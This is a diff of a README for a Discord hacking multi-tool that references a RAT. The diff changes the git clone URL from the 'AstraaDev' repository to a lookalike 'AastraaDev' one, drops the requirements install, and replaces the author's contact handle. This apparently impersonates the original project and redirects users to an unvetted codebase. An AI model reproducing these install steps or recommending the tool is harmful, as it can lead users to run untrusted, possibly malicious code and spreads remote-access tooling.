@@ -67,8 +67,7 @@ Launch the setup.bat file. A new file will be created. You will only have to lau
 
 #### 2nd・Installation (Manual installation)
 ```
-$ git clone https://github.com/AstraaDev/Discord-All-Tools-In-One.git
-$ python -m pip install -r requirements.txt
+$ git clone https://github.com/AastraaDev/Discord-Multi-Tool
 $ python3 astraahome.py
 ```
 
@@ -76,7 +75,7 @@ $ python3 astraahome.py
 General Informations:
 - If you have a problem, [CLICK HERE](https://www.youtube.com/watch?v=27-Swg_MUNw&t=16s) to watch the YouTube video.
 - Find your output files in the  [temp](/temp) folder.
-- If you find any malfunction, contact me on Discord: Astraa#1000.
+- If you find any malfunction, contact me on Discord: KFC#8364
 
 Script Informations:
 - For the operation of the RAT Tool, please refer to the [creator's page](https://github.com/moom825/Discord-RAT).
